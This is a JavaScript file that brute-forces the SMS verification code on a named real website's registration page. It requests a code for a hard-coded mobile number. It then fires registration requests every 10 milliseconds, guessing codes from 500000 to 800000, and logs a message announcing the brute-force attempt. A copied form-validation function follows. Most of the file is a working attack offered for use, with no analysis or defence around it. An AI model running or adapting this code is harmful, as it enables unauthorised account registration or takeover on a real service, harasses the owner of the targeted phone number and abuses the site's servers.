/**
 * Created by Administrator on 2015/9/23.
 */



var PL = function (tel) {
    var self = this;
    this.tel = tel;
    this.yzm = null;
    this.setYzm = function () {
        $.ajax({
            url: "http://www.jimei.cn/verifyCode",
            data: "phone=" + self.tel + "&date=" + new Date().getTime(),
            type: "get",
            dataType: "json",
            success: function () {
                console.log("1：获取验证码 等待暴利破解！");
            }
        });
    }
    this.setYzm();
    this.pj = function (yzm) {

        $.ajax({
            url: "http://www.jimei.cn/isuserregiste.html",
            //data: "password=1&pwdconfirm=1&phone=15801606686&date=" + new Date().getTime(),
            data: {
                "phone": self.tel,
                "password": "jimeijiaju",
                "pwdconfirm": "jimeijiaju",
                "verifyCode": yzm
            },
            type: "get",
            dataType: "json",
            success: function (data) {
                console.log($("#sign").find(".failure").html() + "  当前index：" + yzm);
            }
        });

    };
    this.timer = null;
    var i = 500000;
    this.init = function () {

        this.timer = setInterval(function () {

            if (i == 800000) {
                clearInterval(self.timer);
            } else {
                self.pj(i);
                i++;
            }

        }, 10)

    }
    this.init();
}
PL.start = function (tel) {
    new PL(tel);
}
PL.start('13439295536');

function regValidate() {
    var phone = /^[1][3,4,5,7,8][0-9]{9}$/;
    //帐户
    if ($("#rname").val() == "") {
        $("#rnameTip").html("作为用户名的手机号不能为空");
        return "1";
    }
    if (!(phone.test($("#rname").val()))) {
        $("#rnameTip").html("请输入正确手机号作为用户名");
        return "1";
    }

    //验证码
    if ($("#rcode").val() == "") {
        $("#rcodeTip").html("请输入验证码");
        return "1";
    }

    if (!(/^\d{6,6}$/.test($("#rcode").val()))) {
        $("#rcodeTip").html("请输入正确验证码");
        return "1";
    }
    var rightCode = false;
    $.ajax({
        async: false,
        url: "http://www.jimei.cn/register!ajaxCheckCode.action",
        data: "safecode=" + $("#rcode").val() + "&date=" + new Date().getTime(),
        type: "get",
        dataType: "json",
        success: function (data) {
            rightCode = data.flag;
        }
    });
    if (!rightCode) {
        $("#rcodeTip").html("请输入正确验证码");
        return "1";
    }
    $("#rcodeTip").html("");


    $("#rcodeTip").html("");
    return "0";
}
